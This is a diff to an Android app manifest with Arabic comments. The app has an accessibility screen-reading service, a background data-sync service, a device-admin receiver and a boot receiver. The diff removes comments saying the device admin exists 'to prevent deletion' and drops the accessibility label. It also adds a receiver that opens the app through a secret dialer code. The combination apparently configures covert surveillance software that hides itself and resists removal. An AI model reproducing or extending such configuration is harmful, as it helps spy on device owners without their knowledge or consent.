@@ -11,7 +11,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
 
-    <!-- الإشعارات (أندرويد 13+) -->
+    <!-- الإشعارات -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
 
     <!-- إعادة التشغيل -->
@@ -50,7 +50,7 @@
             </intent-filter>
         </service>
 
-        <!-- خدمة قراءة الشاشة (Accessibility) -->
+        <!-- خدمة قراءة الشاشة -->
         <service
             android:name=".ScreenReaderService"
             android:exported="true"
@@ -76,7 +76,7 @@
             android:exported="false"
             android:foregroundServiceType="dataSync"/>
 
-        <!-- مدير الجهاز (لمنع الحذف) -->
+        <!-- مدير الجهاز -->
         <receiver
             android:name=".AdminReceiver"
             android:exported="true"
@@ -95,6 +95,16 @@
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+
+        <!-- الكود السري لفتح التطبيق: *#*#1234#*#* -->
+        <receiver
+            android:name=".SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE"/>
+                <data android:scheme="android_secret_code" android:host="1234"/>
             </intent-filter>
         </receiver>
 
